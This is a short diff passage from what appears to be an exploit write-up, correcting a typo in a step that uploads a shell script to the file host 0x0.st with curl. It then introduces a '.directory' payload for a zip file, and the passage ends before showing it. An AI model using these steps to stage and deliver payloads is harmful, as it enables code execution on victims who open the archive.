@@ -9,7 +9,7 @@ I would suggest using https://0x0.st with the following command
 ```
 curl -F'file=@FILENAME.sh' https://0x0.st
 ```
-It will retun a link for your shell script.
+It will return a link for your shell script.
 
 Now wee need to make the payload named .directory to add to our .zip
 ```
